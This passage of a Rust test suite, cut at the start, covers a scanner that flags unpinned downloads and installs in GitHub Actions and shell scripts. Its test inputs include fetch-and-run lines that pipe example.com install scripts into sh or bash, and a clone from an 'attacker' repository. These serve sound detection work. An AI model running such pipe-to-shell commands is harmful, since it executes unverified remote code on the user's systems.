            "test.py",
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "trusted host");
    }

    #[test]
    fn finding_includes_action_name() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o foo",
            "test.sh",
            1,
            "actions/checkout@abc1234",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].action, "actions/checkout@abc1234");
    }

    #[tokio::test]
    async fn scan_action_source_reports_incomplete_when_any_file_fetch_fails() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path(
                "/repos/o/r/git/trees/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            ))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "tree": [
                    { "path": "action.yml", "type": "blob" },
                    { "path": "dist/index.js", "type": "blob" }
                ]
            })))
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/r/contents/action.yml"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string("runs:\n  using: node20\n  main: dist/index.js\n"),
            )
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/r/contents/dist/index.js"))
            .respond_with(ResponseTemplate::new(500))
            .mount(&server)
            .await;

        let client = GitHubClient::with_base("t".into(), server.uri());
        let action = ActionRef {
            owner: "o".into(),
            repo: "r".into(),
            subpath: None,
            ref_string: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
            ref_type: workflow::RefType::Sha,
            tag_comment: Some("v1.0.0".into()),
            line_number: 1,
            raw_line: String::new(),
        };
        let mut collector = AuditCollector::new(false);

        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
            .await
            .unwrap();

        assert_eq!(status, ActionScanStatus::Incomplete);
        assert!(
            collector.findings.is_empty(),
            "failed fetch should not invent findings, only block clean caching"
        );
    }

    #[tokio::test]
    async fn scan_action_source_includes_metadata_entrypoint() {
        use serde_json::json;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path(
                "/repos/o/r/git/trees/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            ))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "tree": [
                    { "path": "action.yml", "type": "blob" },
                    { "path": "dist/runner", "type": "blob" }
                ]
            })))
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/r/contents/action.yml"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string("runs:\n  using: node20\n  main: dist/runner\n"),
            )
            .up_to_n_times(1)
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/repos/o/r/contents/dist/runner"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string(r#"fetch("https://example.com/install")"#),
            )
            .mount(&server)
            .await;

        let client = GitHubClient::with_base("t".into(), server.uri());
        let action = ActionRef {
            owner: "o".into(),
            repo: "r".into(),
            subpath: None,
            ref_string: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
            ref_type: workflow::RefType::Sha,
            tag_comment: Some("v1.0.0".into()),
            line_number: 1,
            raw_line: String::new(),
        };
        let mut collector = AuditCollector::new(false);

        let status = scan_action_source(&client, &action, &mut collector, &DEFAULT_CONFIG)
            .await
            .unwrap();

        assert_eq!(status, ActionScanStatus::Complete);
        assert_eq!(collector.findings.len(), 1);
        assert_eq!(collector.findings[0].source_file, "o/r (dist/runner)");
    }

    #[test]
    fn checksum_at_boundary_of_three_lines_suppresses() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/download/tool -o tool\necho step1\necho step2\nsha256sum --check tool.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        // Checksum on the third line after the fetch still lands inside the
        // window, so the finding is suppressed and recorded as allowed.
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by checksum verification");
    }

    #[test]
    fn checksum_beyond_three_lines_not_suppressed() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/download/tool -o tool\necho 1\necho 2\necho 3\nsha256sum --check tool.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        // Checksum is on the fourth line — beyond the window — so the fetch is
        // still flagged at full severity.
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    // ── git clone ─────────────────────────────────────────────────────

    #[test]
    fn git_clone_unpinned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("git clone"));
    }

    #[test]
    fn git_clone_versioned_branch_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone --branch v1.2.3 https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn git_clone_main_branch_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone --branch main https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn git_clone_depth_one_versioned_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone --depth 1 --branch v1.2.3 https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn git_clone_followed_by_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/org/repo\ncd repo\ngit checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn git_clone_unrelated_sha_checkout_is_finding() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/attacker/repo\ncd other\ngit checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("git clone"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn git_clone_sha_checkout_beyond_three_lines_still_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone https://github.com/org/repo\necho 1\necho 2\necho 3\ngit checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn git_clone_same_line_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/org/repo && cd repo && git checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn git_clone_git_c_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/org/repo d\ngit -C d checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn shell_scan_catches_fetch_split_across_continuation() {
        // A two-part pattern (command + URL) split across a backslash
        // continuation is one shell command and must be seen whole.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L \\\n  https://example.com/install.sh -o install.sh\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert_eq!(c.findings[0].line, Some(1));
    }

    #[test]
    fn shell_scan_pipe_through_intermediate_stage_single_high_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -fsSL https://example.com/install.sh | tr -d '\\r' | bash",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_comment_backslash_does_not_hide_next_line() {
        // A trailing backslash on a comment is comment text — the next line
        // is a new command and must still be scanned.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "# see docs \\\ncurl https://example.com/install.sh | sh\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].line, Some(2));
    }

    #[test]
    fn shell_scan_same_line_checksum_suppressed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool.tgz https://example.com/tool.tgz && sha256sum -c tool.tgz.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        // One-liner fetch-then-verify (offset 0) is suppressed.
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by checksum verification");
    }

    #[test]
    fn shell_scan_unrelated_checksum_does_not_suppress_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool.sh https://example.com/install.sh\nsha256sum unrelated.txt",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("curl fetching URL"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_matching_checksum_suppresses_fetch() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool.sh https://example.com/install.sh\nsha256sum tool.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by checksum verification");
    }

    #[test]
    fn shell_scan_generic_checksum_manifest_does_not_suppress_fetch() {
        // `sha256sum -c SHA256SUMS` names a manifest, not the downloaded file,
        // so it cannot prove this artifact is pinned: the fetch still flags.
        // Intentional tightening: a generic manifest is not target binding.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -o tool.tgz https://example.com/tool.tgz\nsha256sum -c SHA256SUMS",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("curl fetching URL"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_script_arg_cmd_sub_not_a_pipe_finding() {
        // Fetched bytes passed as a script argument are not executed — this
        // used to fire the high-severity command-substitution rule via the
        // `sh` in the filename. The data-format URL keeps the unversioned
        // rule quiet too, so the line is fully clean.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            r#"./notify.sh "$(curl -s https://api.example.com/status.json)""#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
    }

    #[test]
    fn shell_scan_versioned_url_at_end_of_line_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -LO https://example.com/download/v1.2.3",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn shell_scan_curl_latest_at_end_of_line_is_high() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -LO https://example.com/releases/latest",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_npx_unversioned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "npx create-react-app my-app",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("npx"));
    }

    #[test]
    fn shell_scan_npx_version_pinned_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "npx typescript@5.6.0",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_brew_head_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "brew install ffmpeg --HEAD",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("--HEAD"));
    }

    #[test]
    fn shell_scan_brew_install_without_head_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "brew install ffmpeg",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_ps_install_module_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "Install-Module -Name Pester -Force",
            "test.ps1",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
    }

    #[test]
    fn shell_scan_ps_install_module_required_version_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "Install-Module -Name Pester -RequiredVersion 5.3.1 -Force",
            "test.ps1",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_pip_git_url_unversioned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pip install git+https://github.com/owner/repo.git",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("git+URL"));
    }

    #[test]
    fn shell_scan_pip_git_url_with_ref_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pip install git+https://github.com/owner/repo.git@v1.2.3",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_pip_git_url_branch_ref_is_finding() {
        // `@main` tracks the branch HEAD — not a pin, so it must still fire.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "pip install git+https://github.com/owner/repo.git@main",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("git+URL"));
    }
}
